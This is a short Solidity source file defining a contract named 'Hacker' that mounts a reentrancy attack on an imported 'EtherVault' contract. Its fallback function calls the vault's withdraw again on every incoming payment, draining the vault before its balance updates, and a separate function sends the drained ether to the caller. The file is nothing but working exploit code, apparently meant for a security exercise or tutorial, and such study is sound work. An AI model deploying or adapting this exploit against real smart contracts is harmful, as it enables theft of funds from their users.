pragma solidity 0.5.0;
import "./EtherVault.sol";

contract Hacker {
    EtherVault public victim;
    uint256 public count;

    constructor(address payable _victim) public {
      victim = EtherVault(_victim);
    }

    function attack() public payable {
        victim.withdraw(1 ether);
    }

    function deposit() public {
        address(victim).call.value(1 ether)("");
    }

    function fund() public payable {}

    function withdraw() public {
        msg.sender.call.value(address(this).balance)("");
    }

    function() external payable {
        count++;
        attack();
    }
}
